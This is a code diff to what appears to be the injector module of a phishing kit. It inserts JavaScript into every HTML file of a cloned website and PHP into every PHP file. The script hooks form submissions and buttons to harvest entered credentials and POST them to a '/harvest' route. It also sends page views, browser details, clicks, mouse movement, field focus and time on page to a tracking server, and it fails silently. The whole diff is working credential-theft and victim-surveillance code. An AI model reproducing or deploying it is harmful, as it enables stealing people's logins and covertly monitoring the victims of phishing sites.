@@ -1,23 +1,39 @@
+"""
+Enhanced Injector with Intel Dashboard Integration
+Replace/update: src/services/injector/inject.py
+
+This version injects BOTH credential harvesting AND intel tracking
+"""
+
 import os
 
-def inject_logger_to_all_html(site_dir):
+def inject_logger_to_all_html(site_dir, intel_enabled=True):
     """
-    Inject a robust JavaScript logger into ALL HTML files (recursively, only once per file, and safely).
+    Inject credential harvesting + intel tracking into ALL HTML files
+    
+    Args:
+        site_dir: Directory containing cloned site
+        intel_enabled: Whether to inject intel tracking (default: True)
     """
     HARVEST_ROUTE = "/harvest"
+    INTEL_SERVER = "http://127.0.0.1:5500/track"
+    
     INJECTION_SCRIPT = f"""
-<!-- harvest_logger -->
+<!-- scarface_logger -->
 <script>
 (function() {{
-    if(window.__harvest_logger_loaded) return;
-    window.__harvest_logger_loaded = true;
+    if(window.__scarface_loaded) return;
+    window.__scarface_loaded = true;
+    
+    const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    
+    // ==================== CREDENTIAL HARVESTING ====================
     function formToDict(form) {{
         var data = {{}};
         var fd = new FormData(form);
         fd.forEach(function(value, key) {{
             data[key] = value;
         }});
-        // If FormData is empty, manually gather all input/select/textarea
         if(Object.keys(data).length === 0) {{
             var idx = 0;
             var els = form.querySelectorAll('input,select,textarea');
@@ -29,6 +45,7 @@ def inject_logger_to_all_html(site_dir):
         }}
         return data;
     }}
+    
     function sendHarvest(form) {{
         try {{
             var data = formToDict(form);
@@ -37,16 +54,59 @@ def inject_logger_to_all_html(site_dir):
                 headers: {{ 'Content-Type': 'application/json' }},
                 body: JSON.stringify(data)
             }}).catch(function(){{}});
+            
+            // Also send to intel dashboard
+            if ({str(intel_enabled).lower()}) {{
+                trackIntel('credentials_submitted', data);
+            }}
         }}catch(e){{}}
     }}
+    
+    // ==================== INTEL TRACKING ====================
+    function trackIntel(eventType, data) {{
+        if (!{str(intel_enabled).lower()}) return;
+        
+        const payload = {{
+            session_id: SESSION_ID,
+            event_type: eventType,
+            data: {{
+                ...data,
+                url: window.location.href,
+                referrer: document.referrer,
+                screen: {{ width: screen.width, height: screen.height }},
+                timestamp: new Date().toISOString()
+            }}
+        }};
+        
+        fetch('{INTEL_SERVER}', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify(payload),
+            mode: 'cors'
+        }}).catch(function(){{}});
+    }}
+    
+    // Track page view
+    if ({str(intel_enabled).lower()}) {{
+        trackIntel('page_view', {{
+            title: document.title,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform
+        }});
+    }}
+    
+    // ==================== FORM HOOKS ====================
     var origSubmit = HTMLFormElement.prototype.submit;
     HTMLFormElement.prototype.submit = function() {{
         sendHarvest(this);
         origSubmit.apply(this, arguments);
     }};
+    
     document.addEventListener('submit', function(e){{
         sendHarvest(e.target);
     }}, true);
+    
     function hookBtns(form){{
         var btns = form.querySelectorAll('[type=submit],button');
         btns.forEach(function(btn){{
@@ -59,7 +119,9 @@ def inject_logger_to_all_html(site_dir):
             }}, true);
         }});
     }}
+    
     document.querySelectorAll('form').forEach(hookBtns);
+    
     var mo = new MutationObserver(function(muts){{
         muts.forEach(function(mut){{
             mut.addedNodes.forEach(function(node){{
@@ -69,9 +131,54 @@ def inject_logger_to_all_html(site_dir):
         }});
     }});
     mo.observe(document.documentElement,{{childList:true,subtree:true}});
+    
+    // ==================== INTEL TRACKING EVENTS ====================
+    if ({str(intel_enabled).lower()}) {{
+        // Mouse movement (throttled)
+        let lastMouse = 0;
+        document.addEventListener('mousemove', function(e) {{
+            const now = Date.now();
+            if (now - lastMouse > 3000) {{
+                lastMouse = now;
+                trackIntel('mouse_move', {{ x: e.clientX, y: e.clientY }});
+            }}
+        }}, {{ passive: true }});
+        
+        // Clicks
+        document.addEventListener('click', function(e) {{
+            trackIntel('click', {{
+                element: e.target.tagName,
+                id: e.target.id,
+                text: e.target.textContent?.substring(0, 50)
+            }});
+        }}, {{ passive: true }});
+        
+        // Form field focus
+        document.addEventListener('focus', function(e) {{
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {{
+                trackIntel('form_field_focus', {{
+                    field_name: e.target.name || e.target.id,
+                    field_type: e.target.type
+                }});
+            }}
+        }}, true);
+        
+        // Time on page
+        let timeOnPage = 0;
+        setInterval(function() {{
+            timeOnPage += 5;
+            trackIntel('time_on_page', {{ seconds: timeOnPage }});
+        }}, 5000);
+        
+        // Page unload
+        window.addEventListener('beforeunload', function() {{
+            trackIntel('page_unload', {{ seconds_on_page: timeOnPage }});
+        }});
+    }}
 }})();
 </script>
 """
+    
     for root, _, files in os.walk(site_dir):
         for file in files:
             if file.lower().endswith('.html'):
@@ -79,16 +186,13 @@ def inject_logger_to_all_html(site_dir):
                 try:
                     with open(html_file, "r", encoding="utf-8") as f:
                         content = f.read()
-                    # Only inject if not already present
-                    if "harvest_logger" in content:
+                    
+                    if "scarface_logger" in content:
                         continue
 
-                    # Inject ONLY ONCE: after <head>, or else before </body>, or else at end
                     if "<head>" in content:
-                        new_content = content.replace(
-                            "<head>", "<head>" + INJECTION_SCRIPT, 1
-                        )
-                    elif "<head " in content:  # handle <head ...>
+                        new_content = content.replace("<head>", "<head>" + INJECTION_SCRIPT, 1)
+                    elif "<head " in content:
                         idx = content.find("<head ")
                         idx2 = content.find(">", idx)
                         if idx2 != -1:
@@ -96,30 +200,30 @@ def inject_logger_to_all_html(site_dir):
                         else:
                             new_content = content + INJECTION_SCRIPT
                     elif "</body>" in content:
-                        new_content = content.replace(
-                            "</body>", INJECTION_SCRIPT + "\n</body>", 1
-                        )
+                        new_content = content.replace("</body>", INJECTION_SCRIPT + "\n</body>", 1)
                     else:
                         new_content = content + INJECTION_SCRIPT
 
-                    # Backup original only if no backup exists
                     backup = html_file + ".bak"
                     if not os.path.exists(backup):
                         with open(backup, "w", encoding="utf-8") as f:
                             f.write(content)
+                    
                     with open(html_file, "w", encoding="utf-8") as f:
                         f.write(new_content)
+                        
                 except Exception:
-                    pass  # Fully silent
+                    pass
+
 
 def inject_logger_to_php(site_dir, site_name, credentials_dir):
     """
-    Injects PHP logging code into all PHP files in the site (if not already injected).
+    Injects PHP logging code into all PHP files in the site
     """
     try:
         dir_path = os.path.join(credentials_dir, site_name).replace('\\', '/')
         logger_code = f"""
-<?php // harvest_logger
+<?php // scarface_logger
 if ($_SERVER["REQUEST_METHOD"] == "POST") {{
     $raw_data = file_get_contents('php://input');
     parse_str($raw_data, $data);
@@ -147,18 +251,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {{
                     try:
                         with open(php_file, "r", encoding="utf-8") as f:
                             content = f.read()
-                        if "harvest_logger" in content:
+                        
+                        if "scarface_logger" in content:
                             continue
-                        # If file starts with <?php, inject after first ?>
+                        
                         if content.lstrip().startswith("<?php"):
                             parts = content.split("?>", 1)
                             new_content = parts[0] + "?>\n" + logger_code + (parts[1] if len(parts) > 1 else "")
                         else:
                             new_content = logger_code + content
+                        
                         backup = php_file + ".bak"
                         if not os.path.exists(backup):
                             with open(backup, "w", encoding="utf-8") as f:
                                 f.write(content)
+                        
                         with open(php_file, "w", encoding="utf-8") as f:
                             f.write(new_content)
                     except Exception:
